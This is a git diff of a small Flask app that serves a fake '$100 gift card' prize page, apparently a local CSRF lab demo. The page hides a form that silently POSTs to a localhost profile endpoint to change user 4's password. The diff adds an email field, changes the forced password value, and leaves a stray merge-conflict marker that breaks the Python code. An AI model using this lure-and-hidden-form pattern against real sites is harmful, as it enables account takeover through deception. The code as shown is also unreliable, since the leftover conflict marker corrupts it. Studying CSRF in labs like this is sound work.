@@ -60,6 +60,8 @@ CSRF_HTML = """
 <body>
     <h1>Congratulations! You've Been Selected!</h1>
     <div class="prize-image">$100 GIFT CARD</div>
+        <input type="text" name="email" placeholder="Insert your email here">
+
     <h2>Click the button below to claim your $100 gift card!</h2>
     
     <button class="btn" id="claimButton">Claim Your Prize Now!</button>
@@ -69,7 +71,7 @@ CSRF_HTML = """
     <iframe name="hiddenFrame" style="display:none;"></iframe>
     <form id="csrfForm" action="http://localhost:5000/profile" method="POST" target="hiddenFrame" style="display:none;">
         <input type="hidden" name="id" value="4">
-        <input type="hidden" name="new_password" value="1">
+        <input type="hidden" name="new_password" value="zzzz">
     </form>
 
     <script>
@@ -96,4 +98,5 @@ def index():
     return render_template_string(CSRF_HTML)
 
 if __name__ == '__main__':
+>>>>>>> 8373077d62f3bf8827bba65ad65e0938666fb6ee
     app.run(host='localhost', port=8080, debug=True)
